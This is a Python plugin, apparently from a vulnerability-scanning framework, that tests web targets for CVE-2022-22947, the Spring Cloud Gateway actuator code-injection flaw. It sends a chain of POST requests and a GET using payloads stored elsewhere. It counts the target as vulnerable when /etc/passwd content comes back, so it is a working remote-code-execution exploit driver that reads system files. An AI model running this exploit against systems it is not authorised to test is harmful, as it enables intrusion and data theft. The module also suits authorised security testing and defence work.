#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2022_22947_scan(self, url):
    ''' 在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序
            在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击
            远程攻击者可以发出制作的恶意请求, 在远程主机上进行远程执行任意代码
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2022-22947'
    vul_info['vul_method'] = 'POST'

    for payload in range(len(self.cve_2022_22947_payloads)):
        path = self.cve_2022_22947_payloads[payload]['path']
        data = self.cve_2022_22947_payloads[payload]['data']
        headers = self.cve_2022_22947_payloads[payload]['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            if ((payload + 1) % 3 == 0):        # * 判断路由是否创建成功
                res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            else:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if ((res.status_code == 200) 
                and (('/sbin/nologin' in res.text) 
                    or ('root:x:0:0:root' in res.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Headers': headers,
                    'Payload-1': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': self.cve_2022_22947_payloads[payload-2]['path'],
                        'Data': self.cve_2022_22947_payloads[payload-2]['data']
                    },
                    'Payload-2': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': self.cve_2022_22947_payloads[payload-1]['path'],
                        'Data': self.cve_2022_22947_payloads[payload-1]['data']
                    },
                    'Payload-3': {
                        'Method': 'GET',
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
